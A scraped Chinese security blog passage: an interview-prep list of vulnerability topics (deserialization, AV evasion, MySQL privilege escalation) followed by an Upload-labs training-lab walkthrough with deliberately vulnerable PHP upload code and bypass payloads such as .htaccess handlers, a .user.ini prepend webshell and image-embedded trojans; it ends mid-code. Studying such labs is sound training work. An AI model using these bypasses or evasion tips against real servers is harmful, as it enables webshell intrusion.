23、phar+反序列化https://st4ck.gitee.io/2019/07/20/php-fan-xu-lie-hua-lou-dong/https://st4ck.gitee.io/2020/01/06/python-fan-xu-lie-hua-lou-dong/phar的利用姿https://st4ck.gitee.io/2020/01/04/phar-de-li-yong-zi-shi/)势php反序列化：变量覆盖的问题吧，我们传入的字符串反序列化，导致控制参数或者任意代码执行phar:在使用phar://协议读取文件时，文件会被解析成phar解析过程中会触发php_var_unserialize()函数对meta-data的操作，造成反序列化。 23、http-only绕过方法利用HTML5的CORS特性绕过httpOnly的限制实现XSS会话劫持 24、PHP5.5 ~ PHP7.2 新特性PHP5.5 ~ PHP7.2 新特性整理null合并运算符 +太空船操作符（组合比较符）+preg_replace () 的/e修饰符+assert() 默认不在可以执行代码 php7.2允许重写抽象方法(Abstract method)，扩展了参数类型，允许分组命名空间的尾部逗号php5-&gt;7标量类型声明 有两种模式: 强制 (默认) 和 严格模式。 现在可以使用下列类型参数（无论用强制模式还是严格模式）： 字符串(string), 整数 (int), 浮点数 (float), 以及布尔值 (bool)返回值类型声明null合并运算符 //Before PHP7:$id = isset($_GET[‘id’]) ? $_GET[‘id’] : null;//In PHP7:$id = $_GET[‘id’] ?? null; //equivalent of writing old above syntax CSPRNG（伪随机数产生器）php7取消了preg_replace () 的/e修饰符，preg_replace_callback()assert() 默认不在可以执行代码 性能提升 25、OWASP-top10http://blog.nsfocus.net/owasp-top10-2017/ 26、GOpher协议https://xz.aliyun.com/t/5844 27、文件名解析漏洞https://www.cnblogs.com/zlgxzswjy/p/6561229.htmlhttps://www.jianshu.com/p/224ac688d135 28、java安全Java家族安全 在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。 https://javasec.org/著名java发序列化漏洞 Apache的common Collection组件里的调用链的原理和利用思路(这个文章特别多) 后续的很多软件的漏洞都是因为使用了这个apache的组件导致的。我写了一个关于我的理解(https://tiaotiaolong.net/2019/07/19/Apache-Common组件反序列化原理/)同时也收录到我自己的git项目[tiaoVulenv](https://github.com/tiaotiaolong/tiaoVulenv)里。 关于java反序列化一般都是怎么修复的，修复思路是什么？黑名单？ fastjson 反序列化的问题 关于fastjson我写了一个连载，在博客里，同时也在我自己的git项目tiaoVulenv里。https://xz.aliyun.com/t/5680shiro 认证模块反序列化漏洞 大致原理以及利用方式。读取cookie -&gt; base64解码 -&gt; AES解密 -&gt; 反序列化https://www.cnblogs.com/paperpen/p/11312671.htmlhttps://www.bilibili.com/video/av57241403/Spring 安全 原理 利用方法 Struts2 安全 原理 利用方法（s-45上传模块异常处理）https://www.cnblogs.com/qiantan/p/10695567.html045-https://blog.csdn.net/xiao190128/article/details/61202955https://blog.csdn.net/xiao190128/article/details/61202955JBoss 安全 原理 利用方法(未授权上传+反序列化)https://www.jianshu.com/p/55ef524dd85dTomcat 安全 原理 利用方法（可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。）Tomcat 远程代码执行 WebLogic安全 原理 利用方法https://www.freebuf.com/column/203816.html由WebLogic Server WLS组件远程命令执行漏洞通过构造构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。 jenkins 安全问题 JVM学习 可以参考深入理解Java虚拟机。 29、后渗透https://www.jianshu.com/p/21090f74edb3https://www.jianshu.com/p/aa1e23ccda92 30、FastJson反序列化fastjson 反序列化的问题 关于fastjson我写了一个连载，在博客里，同时也在我自己的git项目tiaoVulenv里。https://xz.aliyun.com/t/5680 31、DNSloghttps://www.cnblogs.com/sstfy/p/10351807.htmlhttps://www.cnblogs.com/afanti/p/8047530.html 32、iptableshttps://blog.csdn.net/weixin_37998647/article/details/78895754 33、JavaScript 原型链污染https://www.anquanke.com/post/id/176884在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止 34、websocket它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。 35、一些cms漏洞分析discuz任意代码执行https://cloud.tencent.com/developer/article/1511932 thinkphp任意代码执行https://blog.csdn.net/qq_40884727/article/details/101452478 36、免杀混淆Powershell天然免杀，我们可以直接用Powershell命令去加载相应的脚本，下载后执行。这种方法是在内存中直接加载，能够绕过杀软的检测第一步，上传Procdump到服务器，Procdump是一个Windows Debug工具，而且是微软爸爸官方提供的，所以无论如何杀软都不会把这货列进黑名单的 https://www.wtfsec.org/mimikatz-mian-sha/ 利用抽空ProcessImage就起了一个进程（正常软件），然后把里面的Image抽掉然后映射你的软件进去 37、sql注入防御https://blog.csdn.net/nzjdsds/article/details/77829158 38、一次有趣的绕过https://www.cnblogs.com/xishaonian/p/7693136.html 39、linux下passwd和shadow区别shadow是root可读passwd匿名都可读 二、python1、PYTHON三大神器：装饰器，迭代器，生成器PYTHON三大神器：装饰器，迭代器，生成器 2、标准库线程安全的队列是哪一个？不安全的是哪一个？logging是线程安全的吗？Python队列都是线程安全的,该问题主要考察你对队列的了解和线程安全的概念.所谓线程安全：就是对于多线程同时操作是是安全的而不会发生写冲突,比如python的Queue相反非线程安全：就是多线程同时操作时会发生写冲突,比如python的其他list,set,dictlogging是Python标准库里的日志模块(线程安全) 三、后渗透1、mysql提权https://blog.csdn.net/he_and/article/details/81434865mof提权:在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。udf提权:UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限https://www.jianshu.com/p/d01167862c42https://www.cnblogs.com/R4v3n/articles/8722657.htmlmysql写木马mysql反弹shell提权phpmyadmin提权 四、其他数据库设计的三大范式1、数据库设计的三大范式 参考https://attacker.cc/index.php/archives/24/","link":"2000/02/13/%E9%9D%A2%E7%BB%8F%E7%A7%AF%E7%B4%AF/"},{"title":"Upload-labs","text":"一、简单上传绕过姿势1.1、前端检查扩展名抓包绕过即可。 1.2、Content-Type 检测文件类型 抓包修改 Content-Type 类型，使其符合白名单规则。 1.3、绕过服务器文件扩展名检测上传webshell服务器端文件扩展名检测是利用服务器端应用程序检测用户上传文件的后缀名，从而做出允许或者阻止的一种方法，该方法包含黑名单和白名单两种形式，具体如下： 黑名单检测：一般是建立一个专门的blacklist文件，里面枚举常见的危险文件后缀。白名单检测：一般是定义一个允许或者阻止用户上传文件类型的后缀的文件，里面枚举相应的文件后缀。 绕过黑名单检测方法： （1）文件名大小写绕过：诸如AsP、Aspx之类的后缀绕过黑名单检测。 （2）黑名单列表绕过：用黑名单里没有的后缀文件进行攻击，iis默认执行.asp、.asa、.cer，有时候黑名单过滤不全，没有过滤掉像后缀为asa、cer之类的文件，但这些文件可以像asp文件一样执行，此时可以使用这些后缀绕过黑名单。 （3）特殊文件名绕过：比如发送的HTTP包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这两种命名方式在windows系统里是不被允许的，所以需要在代理工具burpsuite进行修改，然后绕过验证后，会被windows系统自动去掉后面的点和空格，但注意Unix/Linux系统没有此特性。 （4）0x00截断：在许多语言的常用字符串处理函数中，0x00被认为是终止符，比如应用只允许上传jpg图片，那么可以构造文件名为2.asp%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为%00字符截断的关系，最终会以2.asp存入路径里。具体操作文件名改成xxx.php+.jpg,因为+的hex值是2b,可以通过burp抓包将2b改成00或者直接在文件名上urldecode绕过白名单检测方法 （1）0x00截断：基于白名单检查主要使用0x00截断绕过，同黑名单0x00截断绕过。但对于服务器来说，由于后台某些函数作用（诸如CreateTextFile()），此文件会被%00字符截断，最终会以2.asp存入路径里。 1.4、绕过文件内容检测上传webshell件内容检测即通过检测特定文件某些特殊标志位来判断是否是允许上传的一种方法，以后缀为.jpg图片文件为例，该文件头有一组特殊二进制数标识 FF D8 FF E0 00 10 4A 46 49 46（这些二进制数也叫文件幻数），那么就可以通过判断上传文件的文件头来验证文件的类型。　　其实检测文件幻数只是检测的一项内容，还可以对文件相关信息、文件渲染加载后检测，面对这些检测，可以把一句话木马注入图片文件最后面，这样既实现了代码注入也不会破坏图片结构，具体步骤包括：代码注入图片、引用创建的文件、使用客户端连接一句话木马。 1.5、利用服务器解析漏洞 1）IIS6.0解析漏洞1　　此洞原理是处理文件扩展名出错，导致将/.asp/目录下的所有文件都作为asp文件进行解析。此外具有此特性的不单单是类似/.asp/目录，还包括/.cer /、/.asa /、/.cdx /、/.cer (此种类型浏览器直接输入不允许，需要借助burpsuite工具)、/.asa \\、/.cdx \\目录，本例子以/*.asp/目录举例。 （2）IIS6.0解析漏洞2　　该漏洞的原理是IIS6.0不能正确够解析文件名包含分号（;）的文件，因此诸如2.asp;xx.jpg类似的文件会被解析成2.asp可执行文件，从而导致脚本被执行。此外具有此特性的不单单是类似2.asp;xx.jpg，还包括2.cer;xx.jpg、2.asa;xx.jpg、2.cdx;xx.jpg类型。 （3）IIS7.0/7.5解析漏洞　　IIS7.0/7.5是对php 解析时有一个解析漏洞，只要在url后面追加上字符串”/任意文件名.php”就会按照php的方式去解析，其实这个漏洞是出自php-cgi的漏洞，与IIS7.0/7.5本身无关，具体例子如下。服务器端test.jpg代码为：输入：http://[IP]/test.jpg/noexist.php，会将test.jpg当做php进行解析，其中noexist.php是不存在的文件（但后缀必须是.php）。 （4）Apache文件解析漏洞（不过本地我没跑过orz）　　Apache对于文件名的解析是从后往前解析的，直到遇见一个apache认识的文件类型为止，比如phpshell.php.rar.rar，由于apache不认识.rar文件类型，所以会一直遍历后缀直到.php，然后认为这是个php类型的文件，这样的话可以上传一个包含一句话木马文件名类似phpshell.php.rar.rar的文件，访问该文件将会被当成php文件解析执行，具有此漏洞的版本包括：Apache 2.2.11、Apache 2.2.17、Apache 2.2.6、Apache 2.0.59、Apache 2.2.8。 （5）Nginx解析漏洞　　该漏洞是对一个任意文件名，在后面添加/任意文件名.php的解析漏洞，比如源文件名为nginx.jpg，可以添加成nginx.jpg/x.php，nginx就会把nginx.jpg当成php文件来解析，其实可以说这个漏洞与nginx本身关系不大，nginx只是作为一个代理把请求转发给fastcgi server，php在后端处理这一切，漏洞原因在fasgcgi方式下，php获取环境变量的方式有关，该漏洞官方没有补丁，php认为是一个新特性，为预防该漏洞官方建议修改php.ini文件中cgi.fix_pathinfo为0。 nginx还有一个自身的漏洞，就是它可以对任意文件名后面添加%00.php当成php文件来解析，该漏洞出现在nginx较低版本，包括nginx 0.5.*、nginx 0.6.*、nginx 0.7 &lt;= 0.7.65、nginx 0.8 &lt;= 0.8.37。 1.6、利用.htaccess文件上传webshellhtaccess文件的作用主要是对主配置文件没有访问权限，但又想改变某目录配置情况下使用，假如服务器端没有过滤后缀为.htaccess文件，那么攻击者可以构造该文件修改所在目录文件的配置，比如修改该文件下含“haha”字符串的所有文件按照php文件来解析，那么攻击者在上传构造的.htaccess文件后，再上传仍以后缀只有包含“haha”字符串的一句话木马文件，该文件会被当成php文件解析，具体如下： 建立特定.htaccess 文件 建立一句话木马文件 上传上述文件，并使用菜刀连接 添加文件.htaccess，写入AddType application/x-httpd-php .jpg或者 &lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 1.7、利用 .user.ininginx中使用我们可以上传一个这样的.user.ini： GIF89aauto_prepend_file=a.jpg 然后再上传一个这样的图片马a.jpg： GIF89a&lt;script language=&apos;php&apos;&gt;system(&apos;cat /flag&apos;);&lt;/script&gt; https://xz.aliyun.com/t/6091 正文 环境配置github地址：https://github.com/c0ny1/upload-labs直接跑docker就完事了 创建镜像 $ cd upload-labs/docker$ docker build -t upload-labs . 或 $ docker pull c0ny1/upload-labs 创建容器 $ docker run -d -p 80:80 upload-labs:latest 所有题目我们均上传phpinfo.php，执行成功便代表解出题目 Pass-01由前端限制，直接控制台修改函数就行源码 function checkFile() { var file = document.getElementsByName(&apos;upload_file&apos;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} Hack:上传成功-前端果然无安全可言~ Pass-02只判断了Content-Type $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;文件类型不正确，请重新上传！&apos;; } } else { $msg = UPLOAD_PATH.&apos;文件夹不存在,请手工创建！&apos;; }} Hack:方法1：上传一个phpinfo.php,然后抓包修改Content-Type: image/jpeg方法2：上传一个phpinfo.jpg，然后抓包修改后缀为php Pass-03后端禁了后缀&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;如果严格大小写可以大小写绕过，忽略了大小写可以用别名：php2, php3, php4, php5, phps, pht, phtm, phtml源码 $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; }} Hack:php3,phtml绕过 Pass-04通过htaccess绕过本题基本上ban了所有我们想要的后缀，除了jpg,但是没有ban.htaccess $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;此文件不允许上传!&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; }} Hack: 新建文件.htaccess,内容为：(所有文件当php执行) SetHandler application/x-httpd-php 或者（指定jpg当php执行） &lt;FilesMatch &quot;jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; (win10建没有名字的文件copy htaccess.txt .htaccess) Pass-05大小写绕过源码 $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;此文件类型不允许上传！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; }} 由于上了上面的$file_ext = strtolower($file_ext); //转换为小写，所以可以大小写绕过 Hack上传一个phpinfo.Php即可 Pass-06由于缺少trim，可以空格过滤~上传成功了，我晕了保存的文件后缀居然也有空格，而且保存的时候没消除~网上说windows保存会默认取消后面的空格？？wtf大家都用win10搭靶场么我晕了-这个应该只是单纯的win10漏洞吧 Pass-07还是黑名单，但是没有对后缀名进行去”.”处理,这就要求win10服务器了 Hack:利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过： Pass-08少了 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA查了一下::$DATA干嘛的 在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名.... 所以抓包上传，在文件名尾部添加::$DATA Pass-09未递归过滤，可以复写绕过 $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;此文件类型不允许上传！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; }} 由于构造 $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;这样的文件名，复写回到第七关 Hack:构造phpinfo.php..,这样的文件名 Pass-10过滤了后缀，复写绕过（类似于sql里的selselectect源码 $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; }}?&gt; Hack:phpinfo.phphpp Pass-11设置了白名单，%00截断源码 $is_upload = false;$msg = null;if(isset($_POST[&apos;submit&apos;])){ $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }} %00截断条件 php版本小于5.3.4详情关注CVE-2006-7243php的magic_quotes_gpc为OFF状态 Hack:$img_path可以自己控制，%00截断以后服务器会认为是test.php不过我死活绕不过去,Windows服务器也部署了一下好像一样的，嘤嘤嘤（如果burp抓不到本地的包，可以改一下自己的host,然后访问即可 Pass-12还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。，依然打不通，burp里先写%00,然后转码方便一些 Pass-13检验了文件头2个字节,对应关系如下 jpg-&gt;FF D8 -&gt; 255 216png-&gt;89 50 -&gt;137 90gif-&gt;47 49 -&gt; 71 73 源代码 function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]); $fileType = &apos;&apos;; switch($typeCode){ case 255216: $fileType = &apos;jpg&apos;; break; case 13780: $fileType = &apos;png&apos;; break; case 7173: $fileType = &apos;gif&apos;; break; default: $fileType = &apos;unknown&apos;; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST[&apos;submit&apos;])){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $file_type = getReailFileType($temp_file); if($file_type == &apos;unknown&apos;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} Hack:先制作木马 copy normal.jpg /b + shell.php /a webshell.jpg 上传成功但是后缀不能改，所以通过包含丢出去 &lt;?php$file=$_GET[&apos;page&apos;];include($file);?&gt; Pass-14getimagesize()函数绕过先看看getimagesize()函数干嘛的etimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组源码 function isImage($filename){ $types = &apos;.jpeg|.png|.gif&apos;; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST[&apos;submit&apos;])){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} Hack:13一样，当你直接改后缀返回bool,但是和13一样的payload即可 Pass-15exif_imagetype函数绕过exif_imagetype函数作用：文档描述：exif_imagetype() reads the first bytes of an image and checks its signature. function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST[&apos;submit&apos;])){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} hack：和十三一样 Pass-16二次渲染绕过 $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $filetype = $_FILES[&apos;upload_file&apos;][&apos;type&apos;]; $tmpname = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $target_path=UPLOAD_PATH.&apos;/&apos;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = 